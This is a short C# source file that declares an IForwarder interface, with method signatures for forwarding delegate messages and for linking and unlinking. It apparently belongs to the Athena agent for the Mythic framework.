using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Athena.Models.Config
{
    public interface IForwarder
    {
        public abstract Task<bool> ForwardDelegateMessage(DelegateMessage dm);
        public abstract Task<bool> Unlink();
        public abstract Task<bool> Link(MythicJob job, string uuid);
    }
}
